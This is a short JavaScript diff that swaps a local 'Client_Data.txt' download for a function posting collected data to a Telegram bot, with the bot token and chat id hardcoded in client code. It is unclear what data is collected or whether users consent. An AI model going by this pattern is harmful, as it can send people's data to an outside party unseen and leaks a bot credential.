@@ -77,7 +77,8 @@ function getData(){
         }
     }
     console.log(string)
-    saveToPC(string)
+    // saveToPC(string)
+    telegram(string)
     return false
 
 }
@@ -88,6 +89,18 @@ function saveToPC(str){
     link.setAttribute("href", URL.createObjectURL(blob));
     link.setAttribute("download", "Client_Data.txt");
     link.click();
+}
+
+bot = 't.me/testBotAboutCat_bot'
+token = '6273327730:AAFsKa4fQ099v97L2NFILGfyz_VlNGc8iZQ'
+chatid = '50853567'
+
+function telegram(str){
+    let z=$.ajax({
+    type: "POST",
+    url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
+    data: "parse_mode=HTML&text="+encodeURIComponent(str),
+    }).then(alert('отправили в тг') )
 }
 
 
